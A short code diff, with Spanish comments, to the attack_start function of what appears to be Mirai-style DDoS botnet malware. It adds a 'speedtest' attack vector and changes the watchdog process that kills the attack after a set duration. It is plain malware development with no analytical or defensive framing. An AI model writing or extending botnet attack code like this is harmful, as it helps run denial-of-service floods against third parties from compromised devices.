@@ -165,13 +165,17 @@ void attack_start(unsigned int duration, ATTACK_VECTOR vector, uint8_t targs_len
 
     else if (pid2 == 0)
     {
-        sleep(duration);
+        // Watchdog: espera duration (+3 si es speedtest) y luego mata al padre
+        if (vector == ATK_VEC_SPEEDTEST)
+            sleep(duration + 3);   // margen extra para que el speedtest pueda reportar
+        else
+            sleep(duration);
         kill(getppid(), 9);
         exit(0);
     }
     else
     {
-        int i = 0;
+        int i;
         for (i = 0; i < methods_len; i++)
         {
             if (methods[i]->vector == vector)
@@ -184,9 +188,16 @@ void attack_start(unsigned int duration, ATTACK_VECTOR vector, uint8_t targs_len
             }
         }
 
-        sleep(5);
+        // Para speedtest, no dormimos 5 segundos; matamos al watchdog inmediatamente.
+        if (vector == ATK_VEC_SPEEDTEST)
+        {
+            kill(pid2, 9);   // eliminar watchdog sobrante
+        }
+        else
+        {
+            sleep(5);
+        }
 
-        //just bail if the function returns
         exit(0);
     }
 }
